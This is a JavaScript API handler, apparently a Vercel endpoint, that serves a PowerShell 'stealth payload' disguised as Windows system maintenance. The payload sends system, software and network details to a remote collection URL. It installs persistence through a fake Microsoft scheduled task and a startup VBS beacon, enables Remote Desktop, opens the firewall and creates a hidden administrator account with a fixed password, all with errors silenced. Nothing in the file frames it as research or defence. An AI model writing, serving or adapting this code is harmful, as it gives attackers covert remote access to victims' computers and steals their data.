export default function handler(req, res) {
  // Advanced stealth payload that mimics legitimate Windows activity
  const stealthPayload = `# Windows System Maintenance Script
# This looks like legitimate Windows maintenance but establishes persistence

try {
    # 1. Legitimate-looking system information collection
    $systemData = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
        BuildNumber = (Get-WmiObject Win32_OperatingSystem).BuildNumber
        LastBootTime = (Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)
        Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        ScanType = 'RoutineSystemMaintenance'
    } | ConvertTo-Json

    # 2. Send telemetry data (disguised as Windows telemetry)
    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='system_telemetry'; data=$systemData} -UseBasicParsing -UserAgent 'Windows-Update-Agent'

    # 3. Create persistence via Windows Task Scheduler (disguised as system maintenance)
    $taskName = "Microsoft\\Windows\\SystemMaintenance"
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"try { `$result = Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/beacon' -Method POST -Body @{computer='$env:COMPUTERNAME'; status='active'} -UseBasicParsing -UserAgent 'Windows-Update-Agent'; Start-Sleep 300 } catch { Start-Sleep 300 }`""
    $taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "System maintenance tasks" -RunLevel Highest -Force

    # 4. Enable RDP for remote support (disguised as remote assistance)
    Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

    # 5. Create backup admin account (disguised as system account)
    net user "SystemSupport" "WinSupport123!" /add /fullname:"Windows System Support" /comment:"System maintenance account" /y 2>$null
    net localgroup administrators "SystemSupport" /add 2>$null

    # 6. Collect installed software (looks like inventory scan)
    $software = Get-WmiObject -Class Win32_Product | Select-Object -First 10 Name, Version
    $softwareData = @{
        InstalledSoftware = $software
        ScanTime = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    } | ConvertTo-Json
    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='software_inventory'; data=$softwareData} -UseBasicParsing

    # 7. Check network configuration (legitimate-looking network scan)
    $networkInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 5 InterfaceAlias, IPAddress
    $networkData = @{
        NetworkAdapters = $networkInfo
        ScanType = 'NetworkConfigurationCheck'
    } | ConvertTo-Json
    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='network_scan'; data=$networkData} -UseBasicParsing

    # 8. Create startup persistence (disguised as system utility)
    $startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUtilities.vbs"
    $startupScript = "Set WshShell = CreateObject(`"WScript.Shell`")\nWshShell.Run `"powershell -WindowStyle Hidden -Command `\"try { Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/heartbeat' -UseBasicParsing } catch { }`\"`", 0, False"
    Set-Content -Path $startupPath -Value $startupScript -ErrorAction SilentlyContinue

} catch {
    # All errors are silent - no visible indicators
}`;

  res.setHeader('Content-Type', 'text/plain');
  res.send(stealthPayload);
}
